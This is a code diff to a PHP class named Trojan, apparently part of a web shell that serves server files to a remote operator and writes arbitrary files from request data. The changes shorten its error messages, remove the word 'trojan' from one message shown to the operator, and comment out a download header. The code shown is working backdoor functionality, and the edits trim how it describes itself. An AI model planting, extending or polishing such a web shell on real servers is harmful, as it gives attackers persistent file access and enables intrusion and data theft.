@@ -46,8 +46,8 @@ class Trojan{
             # if the method doesn't exist, send back an error message
             else {
                 $this->response = array(
-                    'error'          => "wash error: the method $method is not supported by the trojan.",
-                    'output'         => "wash error: the method $method is not supported by the trojan.",
+                    'error'          => "wash error: method $method is unsupported.",
+                    'output'         => "wash error: method $method is unsupported.",
                     'prompt_context' => $this->prompt_context,
                 );
                 $this->send_response();
@@ -130,7 +130,7 @@ class Trojan{
         chdir($this->cwd);
         # if the requested file exists, serve it up to the user
         if(file_exists($args['file'])){
-            header('Content-Description: File Transfer');
+            //header('Content-Description: File Transfer');
             //header('Content-Type: application/octet-stream');
             header('Content-Disposition: attachment; filename='.basename($args['file']));
             header('Content-Transfer-Encoding: binary');
@@ -203,10 +203,10 @@ class Trojan{
         # Attempt to write the file, and notify the user of the result. Again,
         # I'm combining several error checks here just to keep the trojan small.
         if(file_put_contents($args['file'], $args['data']) === false){
-            $this->response['error'] = 'Failed to write file. It may not be writable, or may not exist.';
+            $this->response['error'] = 'Failed. File may not be writable, or may not exist.';
         }
         else {
-            $this->response['output'] = 'File written successfully.';
+            $this->response['output'] = 'Write successful.';
         }
         $this->response['prompt_context'] = $this->prompt_context;
         $this->send_response();
